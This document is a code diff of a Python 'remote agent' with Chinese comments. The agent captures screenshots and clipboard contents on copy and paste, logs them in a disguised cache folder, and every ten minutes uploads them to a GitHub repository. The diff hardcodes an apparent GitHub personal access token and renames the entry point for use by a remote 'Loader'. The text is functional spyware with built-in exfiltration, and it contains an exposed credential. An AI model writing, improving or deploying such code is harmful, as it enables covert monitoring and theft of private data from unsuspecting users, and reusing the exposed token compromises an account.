@@ -1,4 +1,3 @@
-# remote_agent.py (放置在 GitHub 仓库根目录或指定路径)
 import base64
 import os
 import socket
@@ -10,53 +9,27 @@ import pyperclip
 import requests
 
 DEVICE_NAME = socket.gethostname()
-
 SAVE_DIR = r"D:\AppDataLogs\Cache"
 os.makedirs(SAVE_DIR, exist_ok=True)
-
-# 优先从本地环境变量获取 Token，如果不存在则从本地 token.txt 文件读取
-def get_local_token():
-    env_token = os.environ.get("GITHUB_TOKEN")
-    if env_token:
-        return env_token.strip()
-    
-    token_file_path = os.path.join(SAVE_DIR, "token.txt")
-    if os.path.exists(token_file_path):
-        try:
-            with open(token_file_path, "r", encoding="utf-8") as f:
-                return f.read().strip()
-        except Exception:
-            pass
-    return ""
 
 GITHUB_CONFIG = {
     "username": "Bei18",
     "repo_name": "my-python-storage",
-    "token": get_local_token(),
+    "token": "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",
 }
 
 uploaded_files = set()
-
 
 def upload_file_smart(file_path):
     if not os.path.exists(file_path):
         return False
 
-    # 动态保证 Token 最新的状态
-    token = GITHUB_CONFIG["token"] or get_local_token()
-    if not token:
-        return False
-
     file_name = os.path.basename(file_path)
-    # 忽略本地保存 Token 的文件，防止误上传到远程仓库
-    if file_name == "token.txt":
-        return False
-
     target_path = f"uploads/{DEVICE_NAME}/{file_name}"
 
     base_url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{target_path}"
     headers = {
-        "Authorization": f"Bearer {token}",
+        "Authorization": f"Bearer {GITHUB_CONFIG['token']}",
         "Accept": "application/vnd.github+json",
     }
 
@@ -83,7 +56,6 @@ def upload_file_smart(file_path):
     except Exception:
         return False
 
-
 def scheduled_upload_task():
     while True:
         time.sleep(600)
@@ -98,24 +70,22 @@ def scheduled_upload_task():
         except Exception:
             pass
 
-
 def get_log_file_path():
     today_date = time.strftime("%Y-%m-%d")
     log_filename = f"{DEVICE_NAME}-{today_date}-LOG.txt"
     return os.path.join(SAVE_DIR, log_filename)
 
-
 def write_txt(action_type, detail=""):
     timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
     log_content = f"[{timestamp}] [{action_type}] {detail}\n"
     log_file = get_log_file_path()
+
     try:
         with open(log_file, "a", encoding="utf-8") as f:
             f.write(log_content)
             f.flush()
     except Exception:
         pass
-
 
 def take_full_screenshot(action_type):
     timestamp = time.strftime("%Y%m%d_%H%M%S")
@@ -134,7 +104,6 @@ def take_full_screenshot(action_type):
         except Exception:
             return None
 
-
 def get_clipboard_content():
     try:
         time.sleep(0.1)
@@ -147,18 +116,15 @@ def get_clipboard_content():
     except Exception:
         return "获取失败"
 
-
 def on_copy():
     img_file = take_full_screenshot("COPY")
     clip_text = get_clipboard_content()
     write_txt("复制(Ctrl+C)", f"截图: {img_file} | {clip_text}")
 
-
 def on_paste():
     img_file = take_full_screenshot("PASTE")
     clip_text = get_clipboard_content()
     write_txt("粘贴(Ctrl+V)", f"截图: {img_file} | {clip_text}")
-
 
 def on_press(key):
     try:
@@ -168,9 +134,9 @@ def on_press(key):
     except Exception:
         pass
 
-
-def main():
-    write_txt("启动", "代码加载成功，开始执行...")
+# 提供给 Loader 调用的入口方法
+def run():
+    write_txt("启动", "远程代码加载执行中...")
 
     upload_thread = threading.Thread(target=scheduled_upload_task, daemon=True)
     upload_thread.start()
@@ -185,6 +151,5 @@ def main():
 
     hotkey_listener.stop()
 
-
 if __name__ == "__main__":
-    main()
+    run()
